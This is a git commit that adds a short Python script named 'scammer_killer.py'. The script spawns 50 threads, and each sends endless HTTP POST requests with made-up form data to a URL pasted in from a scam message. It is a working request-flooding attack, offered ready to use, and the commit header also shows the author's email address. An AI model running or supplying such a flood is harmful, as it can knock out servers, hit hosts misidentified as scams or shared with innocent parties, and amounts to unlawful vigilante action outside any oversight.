8042ee7c721ff0777fb3d80b2db8a333086e98a5
Chris Renshaw <slybandit247@gmail.com>
2022-02-06 23:36:39 -0500

    Add files via upload
    Need to manually add URL and data

---
+++ scammer_killer.py
@@ -0,0 +1,37 @@
+
+#SCAMMER KILLER
+import requests
+import threading
+import socket
+
+#Copy URL from Scam message
+url = ""
+
+#In the console copy the request headers/data sent
+
+data = {
+    "fname": "mike",
+    "lname": "any",
+    "id": "A112",
+    "number": "0009"
+}
+
+def do_request():
+    while True:
+        a = 0
+        a += 1
+        response = requests.post(url, data=data)
+        print(a, response)
+
+threads = []
+
+for i in range(50):
+    t = threading.Thread(target=do_request)
+    t.daemon = True
+    threads.append(t)
+
+for i in range(50):
+    threads[i].start()
+
+for i in range(50):
+    threads[i].join()
